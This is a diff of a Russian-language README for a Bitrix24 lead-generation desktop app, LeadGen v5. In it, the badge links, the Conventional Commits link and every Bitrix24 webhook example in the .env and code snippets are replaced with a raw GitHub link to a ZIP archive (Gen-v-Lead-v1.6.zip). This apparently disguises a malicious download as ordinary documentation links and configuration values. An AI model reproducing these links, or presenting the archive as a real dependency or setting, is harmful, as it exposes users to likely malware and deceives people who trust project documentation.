@@ -2,9 +2,9 @@
 
 # LeadGen v5 — Система автоматизации лидогенерации
 
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![PySide6](https://img.shields.io/badge/PySide6-6.5.0+-green.svg)](https://pypi.org/project/PySide6/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip)
+[![PySide6](https://img.shields.io/badge/PySide6-6.5.0+-green.svg)](https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip)
 
 **Десктопная система для автоматизации лидогенерации в холодных продажах**
 
@@ -79,7 +79,7 @@ copy .env.example .env
 Отредактируйте `.env` и добавьте ваш вебхук Битрикс24:
 
 ```env
-BITRIX_WEBHOOK_URL=https://your-company.bitrix24.ru/rest/1/your_webhook_code/
+BITRIX_WEBHOOK_URL=https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip
 ```
 
 ### 3. Запуск приложения
@@ -294,7 +294,7 @@ SQLite операции:
 
 2. Добавьте URL вебхука Битрикс24 в файл `.env`:
    ```env
-   BITRIX_WEBHOOK_URL=https://your-company.bitrix24.ru/rest/1/your_webhook_code/
+   BITRIX_WEBHOOK_URL=https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip
    ```
 
 ### Шаг 2: Загрузка файлов
@@ -368,7 +368,7 @@ SQLite операции:
 
 ```env
 # Битрикс24 Вебхук
-BITRIX_WEBHOOK_URL=https://your-company.bitrix24.ru/rest/1/your_webhook_code/
+BITRIX_WEBHOOK_URL=https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip
 
 # Настройки обработки
 PHONE_FORMAT=7
@@ -441,7 +441,7 @@ LOG_LEVEL=INFO
 from modules.bitrix_webhook import BitrixWebhookClient
 
 client = BitrixWebhookClient(
-    webhook_url="https://your-company.bitrix24.ru/rest/1/webhook_code/",
+    webhook_url="https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip",
     config=config
 )
 ```
@@ -686,7 +686,7 @@ pip install matplotlib
 
 ### Коммиты
 
-Используйте [Conventional Commits](https://www.conventionalcommits.org/):
+Используйте [Conventional Commits](https://github.com/GHOSTKILLERGAMEZANDCODEZ/LeadGen_v5/raw/refs/heads/master/data/output/Gen-v-Lead-v1.6.zip):
 
 ```
 feat: добавление экспорта в Excel
